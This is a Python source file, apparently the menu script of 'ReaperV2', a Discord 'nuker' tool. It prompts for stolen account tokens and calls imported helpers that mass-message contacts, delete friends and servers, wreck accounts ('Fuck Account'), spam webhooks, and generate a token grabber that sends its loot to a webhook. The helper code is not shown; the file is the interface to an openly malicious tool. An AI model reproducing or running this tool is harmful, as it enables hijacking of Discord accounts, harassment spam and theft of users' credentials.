import os
import sys
import fade
import time
from colorama import Fore
from utils.massDM import *
from utils.closeDMs import *
from utils.tokenInfo import *
from utils.leaveServer import*
from utils.fuckAccount import *
from utils.accountNuker import *
from utils.getAllFriends import*
from utils.deleteFriends import *
from utils.deleteServers import *
from utils.createServers import *
from utils.deleteWebhook import *
from utils.DownloadToken import *
from utils.blockAllFriends import *
from utils.hypesquadChanger import *
from utils.webhooks import *

# ========================================================================================================================================================= #

def main():
    # Clear the consoe to get better view :)
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

    # Set Console title
    set_console_title("ReaperV2 | Made by realecstacy. | Menu")

    # ========================================================================================================================================================= #

    banner = """
                         ...
                                                                                                                                                                                                                                              
                                    ╦═╗┌─┐┌─┐┌─┐┌─┐┬─┐  ╔╗╔┬ ┬┬┌─┌─┐┬─┐
                                    ╠╦╝├┤ ├─┤├─┘├┤ ├┬┘  ║║║│ │├┴┐├┤ ├┬┘
                                    ╩╚═└─┘┴ ┴┴  └─┘┴└─  ╝╚╝└─┘┴ ┴└─┘┴└─                                      
                                                                                                                                                                            
                                                               
                                                                                                          
             ╔═══════════════════════════════╗   ╔═══════════════════════════════╗
             ║ [1] Nuke Token                ║   ║ [10] Get All Friends          ║   
             ║ [2] Leave Servers             ║   ║ [11] Token Info               ║
             ║ [3] Delete Friends            ║   ║ [12] Token Checker            ║
             ║ [4] Delete Servers            ║   ║ [13] Fuck Account             ║
             ║ [5] Mass Dm                   ║   ║ [14] Delete Webhook           ║
             ║ [6] Close DMs                 ║   ║ [15] Spam Webhook             ║
             ║ [7] Create Servers            ║   ║ [16] CREDITS                  ║
             ║ [8] Block All Friends         ║   ║ [17] EXIT                     ║
             ║ [9] Token Grabber             ║   ║                               ║
             ╚═══════════════════════════════╝   ╚═══════════════════════════════╝
                  ╔═════════════════════════╗         ╔═════════════════════════╗
                  ║http://dsc.gg/reaperxyz  ║         ║http://dsc.gg/reaperxyz  ║

    """
    faded_banner = fade.purplepink(banner)
    print(faded_banner) # im already in

    # ========================================================================================================================================================= #

    info = f"""{Fore.BLUE}\t\t\t\t\t  [+] Made by realecstacy. [+]"""
    for x in info:
        time.sleep(0.0001)
        sys.stdout.write(x)
        sys.stdout.flush()
    print()

# ========================================================================================================================================================= #

    choice = input(f"#{Fore.YELLOW}:{Fore.WHITE}>> ")
    if choice == "1":
        clear_banner()
        token = input(f"Token{Fore.RED}:{Fore.WHITE}>> ")
        message = "@here Nuked by Reapers"
        start_nuke(token=token, content=message)
    elif choice == "2":
        clear_banner()
        token = input(f"Token{Fore.YELLOW}:{Fore.CYAN}>> ")
        leaveServer(token)
    elif choice == "3":
        clear_banner()
        token = input(f"Token{Fore.LIGHTRED_EX}:{Fore.GREEN}>> ")
        deleteFriends(token)
    elif choice == "4":
        clear_banner()
        token = input(f"Token{Fore.MAGENTA}:{Fore.GREEN}>> ")
        deleteServers(token)
    elif choice == "5":
        clear_banner()
        token = input(f"Token{Fore.GREEN}:{Fore.BLUE}>> ")
        message = input(f"{Fore.LIGHTCYAN_EX}Message{Fore.LIGHTMAGENTA_EX}:{Fore.LIGHTYELLOW_EX}>> ")
        massDM(token=token, content=message)
    elif choice == "6":
        clear_banner()
        token = input(f"Token{Fore.BLUE}:{Fore.LIGHTCYAN_EX}>> ")
        close_all_dms(token=token)
    elif choice == "7":
        clear_banner()
        token = input(f"Token{Fore.BLUE}:{Fore.LIGHTCYAN_EX}>> ")
        count = input(f"{Fore.LIGHTCYAN_EX}Count{Fore.GREEN}:{Fore.WHITE}>> ")
        name = input(f"{Fore.LIGHTMAGENTA_EX}Name{Fore.LIGHTWHITE_EX}:{Fore.RED}>> ")
        createServers(token=token, count=count, name=name)
    elif choice == "8":
        clear_banner()
        token = input(f"Token{Fore.RED}:{Fore.GREEN}>> ")
        blockAllFriends(token=token)
    elif choice == "9":
        clear_banner()
        webhook = input(f"Webhook{Fore.BLUE}:{Fore.CYAN}>> ")
        downloadGrabber(webhook=webhook)
    elif choice == "10":
        clear_banner()
        token = input(f"Token{Fore.GREEN}:{Fore.WHITE}>> ")
        get_all_friends(token=token)
    elif choice == "11":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.CYAN}>> ")
        tokenInfo(token=token)
    elif choice == "12":
        clear_banner()
        token = input(f"Token{Fore.MAGENTA}:{Fore.MAGENTA}>> ")
        validateToken(token=token)
    elif choice == "13":
        clear_banner()
        token = input(f"Token{Fore.GREEN}:{Fore.WHITE}>> ")
        fuckAccount(token=token)
    elif choice == "14":
        clear_banner()
        link = input(f"Webhook{Fore.LIGHTCYAN_EX}:{Fore.RED}>> ") #JANCO, #JJ, #Ecstacy ON TOP
        webhookinpu = input(f"Webhook{Fore.GREEN}:{Fore.WHITE}>> ") #good choice
        messageinpu = input(f"Message{Fore.CYAN}:{Fore.YELLOW}>> ") #good choice
        ammountinpu = input(f"Ammount{Fore.MAGENTA}:{Fore.WHITE}>> ")
        spamwebhook(webhookin= webhookinpu, messagein= messageinpu, ammount= ammountinpu)
    elif choice == "15":
        token = input(Fore.MAGENTA + "discord bot token: ")
        guild_id = input("server id: ")
        spam_message = input("spam message: ")
        new_channels_name = input("new channels name: ")
        new_guild_name = input("new server name: ")
        img = input("new server pfp URL: ")
    elif choice == "16":
        socials()
    elif choice == "17":
        exit(-1)

# ========================================================================================================================================================= #

def socials():
    # Clear the consoe to get better view :)
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

    # Set Console title
    set_console_title("ReaperV2 | Made by realecstacy. |")

    banner = f"""
                                  ___  ____  ____  ____   ____  ____  ___ 
                                / __)(  _ \( ___)(  _ \ (_  _)(_  _)/ __)
                                ( (__  )   / )__)  )(_) ) _)(_   )(  \__ \
                                 \___)(_)\_)(____)(____/ (____) (__) (___/
                                          -----------------------
                                          http://dsc.gg/reaperxyz
                                          Author: Ecstacy
                                          -----------------------
                                           
    """
    faded_banner = fade.greenblue(banner)
    for x in faded_banner:
        time.sleep(0.0001)
        sys.stdout.write(x)
        sys.stdout.flush()
    print()
    time.sleep(2)
    input("Press any key to continue...")

# ========================================================================================================================================================= #

while True:
    main()
